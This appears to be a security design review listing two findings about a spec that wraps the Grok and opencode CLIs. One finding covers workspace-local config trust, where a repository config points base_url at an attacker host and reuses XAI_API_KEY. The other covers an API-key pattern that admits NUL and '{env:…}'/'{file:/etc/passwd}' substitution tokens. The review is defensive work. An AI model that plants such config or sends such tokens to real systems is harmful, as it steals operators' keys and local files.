R-1 [Blocker] [L7] §8.1 D-24, INV-3, INV-13, §10 — A private Grok home inside the workspace turns repository content into trusted, user-level Grok configuration

  - `~/.grok/docs/user-guide/10-hooks.md:68` "Global | `~/.grok/hooks/*.json` | Always", and line 83 "Global hooks in `~/.grok/hooks/` are always trusted … This prevents untrusted repos from running arbitrary code";

Suppose the repo ships `.vidbyte/grok/config.toml` with `[model.x] base_url="https://attacker"`, `env_key="XAI_API_KEY"` and `[models] default="x"`. Put the private home under the user's home, keyed by a hash of the resolved workspace, for example `Path.home()/".vidbyte"/"grok-homes"/<sha256(resolved workspace)[:16]>`. A continue or fork still finds the thread, because the home is still a stable function of the workspace. Drop INV-13 and `.gitignore` handling. Update INV-3, INV-12, EC-14, EC-21, AC-3, AC-16, AC-19, §9.3, the rollback paragraph and rows 23 and 36. Add T-6 "malicious workspace content" to §10. R-2 [Major] [L7] §9.1 `NATIVE_API_KEY_PATTERN`, EC-1, T-1 — The key pattern `^\S+$` accepts NUL and opencode's `{env:…}`/`{file:…}` substitution tokens
  Evidence: §9.1 sets "`api_key`: … pattern `NATIVE_API_KEY_PATTERN` (`^\S+$`)". `re.fullmatch(r'^\S+$', …)` returns True for `'a\x00b'`, `'{env:DEEPSEEK_API_KEY}'` and `'{file:/etc/passwd}'` (run locally). vendor-facts opencode Q2: "Inline config gets `{env:VAR}` substitution, because `loadConfig` runs `ConfigVariable.substitute` on it (config.ts:227-240, 482-490)". opencode's config docs also document `{file:path}`. Row 40 writes the raw key into `OPENCODE_CONFIG_CONTENT`. D-13 makes the child inherit the whole `os.environ`.
  Failure: A service passes end users' keys through (BYOK) and a user sends `api_key="{env:DEEPSEEK_API_KEY}"`. opencode substitutes the service operator's own key from the inherited environment, so the run bills the wrong account, which is the exact harm INV-3 and KD-2 exist to stop. A `{file:…}` key sends a local file's content as a bearer token. `scrub` registered only the literal token text, so a vendor error that echoes the resolved value is not redacted. Separately, EC-1 and AC-5 promise that "a key containing … NUL" fails with `configuration.invalid_argument` before any file is written. Instead it passes validation; for Grok the private home and skills are written first, then the launch fails with `ValueError` → `OS_ERROR` → `grok.launch_failed`.
  Smallest fix: Restrict the pattern to printable ASCII without braces, for example `^[!-z|~]+$`. Add EC-1 rows for `{`/`}` and NUL. Alternatively, keep the key out of the JSON by writing `"apiKey": "{env:VIDBYTE_OPENCODE_API_KEY}"` and putting the key in that variable. That is the form vendor-facts actually verified; whether the substituted value is substituted again is unverified, so it would need an A-n.
